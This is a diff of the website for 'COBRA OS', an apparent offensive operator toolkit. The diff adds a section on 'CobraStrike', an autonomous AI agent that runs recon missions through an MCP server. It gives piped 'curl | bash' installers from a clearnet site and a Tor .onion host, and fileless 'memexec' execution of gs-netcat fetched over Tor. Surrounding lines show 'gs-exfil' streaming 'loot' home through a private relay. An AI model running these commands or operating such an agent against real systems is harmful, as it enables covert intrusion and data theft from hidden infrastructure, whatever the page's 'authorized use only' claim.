@@ -27,6 +27,7 @@
       <a href="#overview">overview</a>
       <a href="#features">features</a>
       <a href="#ops">ops</a>
+      <a href="#cobrastrike">cobrastrike</a>
       <a href="#anywhere">anywhere</a>
       <a href="#relay">relay</a>
       <a href="#profiles">profiles</a>
@@ -285,10 +286,60 @@ COBRA operator commands (cobra-ops)
   </div>
 </section>
 
-<!-- ======================= SHELL ANYWHERE ======================= -->
-<section id="anywhere" class="section section-alt">
+<!-- ======================= COBRASTRIKE ======================= -->
+<section id="cobrastrike" class="section section-alt">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">04</span> <span class="red">></span> cobrashell, anywhere</h2>
+    <h2 class="sec-title"><span class="sec-num">04</span> <span class="red">></span> cobrastrike — the AI operator</h2>
+    <p class="sec-lede"><strong>CobraStrike</strong> is COBRA's self-contained, headless AI agent. It spawns the
+    <code>cobra-mcp</code> server over stdio, connects as an MCP client, and runs an autonomous loop on
+    <strong>any model on OpenRouter</strong> — driven by a mission file, with a living brain and tradecraft
+    doctrine. Bring <strong>your own API key</strong>; it never touches this site.</p>
+    <div class="build-grid">
+      <div class="build-step">
+        <h3><span class="step-num">1</span> install on any box</h3>
+        <pre class="codeblock"><code><span class="t-dim"># one-liner from this site (clearnet):</span>
+curl -fsSL https://cobra-os.com/cobra/install.sh | bash
+
+<span class="t-dim"># or over Tor, from the .onion mirror:</span>
+torsocks curl -fsSL http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/cobra/install.sh | bash
+
+<span class="t-dim"># then bring your own OpenRouter key:</span>
+cobra setup --save-key   <span class="t-dim"># stored 0600, never sent here</span>
+cobra models             <span class="t-dim"># pick any model</span>
+cobra doctor             <span class="t-dim"># verify the wiring</span></code></pre>
+        <p>Needs Node.js ≥ 18. The installer drops a single self-contained <code>cobra.js</code> in
+        <code>~/.cobra/</code> and a <code>cobra</code> launcher on your PATH. No IDE, no MCP config JSON.</p>
+      </div>
+      <div class="build-step">
+        <h3><span class="step-num">2</span> run the mission</h3>
+        <pre class="codeblock"><code><span class="t-dim"># one-shot headless task:</span>
+cobra run "Recon triage the active target and update the brain"
+
+<span class="t-dim"># execute a mission file:</span>
+cobra mission brain/missions/htb-blue.mission.md
+
+<span class="t-dim"># interactive session:</span>
+cobra chat
+
+<span class="t-dim"># scope it (enforced server-side, in code):</span>
+cobra run "…" --scope "10.10.10.0/24,lab.local"</code></pre>
+        <p>Scans write full output to loot files; the agent reads summaries and pulls detail only when it
+        needs it — token-efficient by design. The brain updates after every phase.</p>
+      </div>
+    </div>
+    <div class="callout callout-red">
+      <strong>authorized use only.</strong> The scope guard is baked into the MCP server, not the client —
+      every network-touching tool validates its target against <code>COBRA_ALLOWED_SCOPE</code> and refuses
+      out-of-scope work in code. Your key is resolved in memory (or a <code>0600</code> file if you opt in),
+      sent only to OpenRouter over HTTPS, and <strong>never</strong> written to this site or any COBRA infra.
+    </div>
+  </div>
+</section>
+
+<!-- ======================= SHELL ANYWHERE ======================= -->
+<section id="anywhere" class="section">
+  <div class="container">
+    <h2 class="sec-title"><span class="sec-num">05</span> <span class="red">></span> cobrashell, anywhere</h2>
     <p class="sec-lede">Not booted into COBRA OS? The operator shell is mirrored on this site — pull it
     onto any Linux box (HTB, VulnHub, a jumped host) and the toolkit comes with you. Same file the OS
     sources at <code>/etc/cobra/cobrashell.sh</code>, served byte-for-byte from this repo.</p>
@@ -333,23 +384,24 @@ bin gs-netcat       <span class="t-dim"># pulled from OUR infra (next section)</
 <!-- ======================= RELAY ======================= -->
 <section id="relay" class="section">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">05</span> <span class="red">></span> gsocket — from our infra</h2>
+    <h2 class="sec-title"><span class="sec-num">06</span> <span class="red">></span> gsocket — from our infra</h2>
     <p class="sec-lede">cobrashell's <code>gs-*</code> toolset (gs-netcat, gs-sftp, gs-exfil) rendezvous
     through a relay: both ends connect <em>outbound</em>, streams are end-to-end encrypted (SRP), and the
     relay only ever sees ciphertext. COBRA runs its own corner of that network — the binaries and the
     relay come from infrastructure we control, not THC's.</p>
     <div class="build-grid">
       <div class="build-step">
-        <h3><span class="step-num">1</span> binaries from cobra-os.com</h3>
+        <h3><span class="step-num">1</span> binaries over Tor</h3>
         <pre class="codeblock"><code><span class="t-dim"># inside cobrashell, on any box:</span>
 xint
-bin gs-netcat     <span class="t-dim"># → dl.cobra-os.com/bin/gs-netcat_linux-x86_64</span>
+bin gs-netcat     <span class="t-dim"># → afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/bin/gs-netcat_linux-x86_64</span>
 
-<span class="t-dim"># or directly / fileless:</span>
-curl -fsSLO https://dl.cobra-os.com/bin/gs-netcat_linux-x86_64
-memexec https://dl.cobra-os.com/bin/gs-netcat_linux-x86_64</code></pre>
+<span class="t-dim"># or directly / fileless, over Tor:</span>
+torsocks curl -fsSLO http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/bin/gs-netcat_linux-x86_64
+memexec http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/bin/gs-netcat_linux-x86_64</code></pre>
         <p>Static upstream builds, mirrored byte-for-byte with <code>.sha256</code> sidecars on the same
-        R2 bucket that ships the ISOs. No GitHub rate limits, no third-party fetch path mid-op.</p>
+        <code>.onion</code> service that ships the ISO. Fully self-hosted — no clearnet binary host, no
+        GitHub rate limits, no third-party fetch path mid-op.</p>
       </div>
       <div class="build-step">
         <h3><span class="step-num">2</span> rendezvous on our relay</h3>
@@ -381,7 +433,7 @@ gs-exfil loot.tar.gz      <span class="t-dim"># stream loot home</span>
 <!-- ======================= PROFILES ======================= -->
 <section id="profiles" class="section section-alt">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">06</span> <span class="red">></span> build profiles</h2>
+    <h2 class="sec-title"><span class="sec-num">07</span> <span class="red">></span> build profiles</h2>
     <p class="sec-lede">The core stays narrow. Extras ride in as space-separated
     <code>COBRA_PROFILES</code> at build time — each one a case in <code>chroot-setup.sh</code>, never
     part of the core list.</p>
@@ -415,7 +467,7 @@ gs-exfil loot.tar.gz      <span class="t-dim"># stream loot home</span>
 <!-- ======================= HARDENING ======================= -->
 <section id="hardening" class="section">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">07</span> <span class="red">></span> hardened by default</h2>
+    <h2 class="sec-title"><span class="sec-num">08</span> <span class="red">></span> hardened by default</h2>
     <div class="harden-grid">
       <ul class="harden-list">
         <li><span class="h-k">root</span> locked (<code>passwd -l</code>) — sudo-only via the <code>operator</code> user, password change forced on first login</li>
@@ -436,7 +488,7 @@ gs-exfil loot.tar.gz      <span class="t-dim"># stream loot home</span>
 <!-- ======================= BUILD ======================= -->
 <section id="build" class="section section-alt">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">08</span> <span class="red">></span> build it yourself</h2>
+    <h2 class="sec-title"><span class="sec-num">09</span> <span class="red">></span> build it yourself</h2>
     <p class="sec-lede">Two host-side scripts do everything. debootstrap wants root, so run them on a
     Debian/Ubuntu host or VM.</p>
     <div class="build-grid">
@@ -477,7 +529,11 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-*.iso</code></pre>
 <!-- ======================= DOWNLOAD ======================= -->
 <section id="download" class="section">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">09</span> <span class="red">></span> get the build</h2>
+    <h2 class="sec-title"><span class="sec-num">10</span> <span class="red">></span> get the build</h2>
+    <p class="sec-lede">The ISO ships <strong>only</strong> from our <code>.onion</code> service — over Tor,
+    end to end. No clearnet mirror, no third-party object store. The clearnet site you're on carries the
+    checksum and the docs; the bytes cross the network where the host's IP stays hidden. Don't trust a
+    network you don't have to? <a href="#build">Build it yourself</a> — same script, same image.</p>
     <div class="dl-grid">
       <div class="dl-card">
         <h3 class="dl-title">cobra-os-20260816.iso</h3>
@@ -489,16 +545,21 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-*.iso</code></pre>
           <li><span>login</span><strong>console autologin — set the operator password on first login (replaces changeme)</strong></li>
         </ul>
         <div class="dl-actions">
-          <a class="btn btn-red" href="https://dl.cobra-os.com/cobra-os-20260816.iso">download iso</a>
+          <a class="btn btn-red" href="http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/downloads/cobra-os-20260816.iso">download iso · onion</a>
           <a class="btn btn-ghost" href="downloads/cobra-os-20260816.iso.sha256" download>sha256</a>
         </div>
-        <p class="dl-note">Builds ship from <code>dl.cobra-os.com</code> (Cloudflare R2 — Pages caps
-        files at 25&nbsp;MiB). The <code>.sha256</code> is mirrored there and versioned in
-        <code>downloads/</code>.</p>
+        <p class="dl-note">The <code>.iso</code> is served from the <code>.onion</code> only (multi-GB over
+        Tor — resumable via HTTP range requests). The <code>.sha256</code> is on both the clearnet site and
+        the onion, and versioned in <code>downloads/</code>. Replace <code>afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion</code> with the live
+        onion address (see the site footer / README once the hidden service is up).</p>
       </div>
       <div class="dl-verify">
-        <h3>verify, then write</h3>
-        <pre class="codeblock"><code><span class="t-dim"># verify the image</span>
+        <h3>fetch over Tor, verify, then write</h3>
+        <pre class="codeblock"><code><span class="t-dim"># pull the image down over Tor (resumable with -C -):</span>
+torsocks curl -fSLO -C - \
+    http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/downloads/cobra-os-20260816.iso
+
+<span class="t-dim"># verify the image</span>
 sha256sum -c cobra-os-20260816.iso.sha256
 
 <span class="t-dim"># expected:</span>
@@ -535,6 +596,7 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-20260816.iso</code></pre>
       <a href="#overview">overview</a>
       <a href="#features">features</a>
       <a href="#ops">ops registry</a>
+      <a href="#cobrastrike">cobrastrike</a>
       <a href="#anywhere">shell anywhere</a>
       <a href="#relay">relay</a>
       <a href="#build">build</a>
@@ -546,6 +608,7 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-20260816.iso</code></pre>
       <span>chroot-setup.sh</span>
       <span>build-iso.sh</span>
       <span>shell/cobrashell.sh</span>
+      <span>CobraStrike/</span>
       <span>BUILD_PLAN.md</span>
       <span>website/release.sh</span>
     </div>
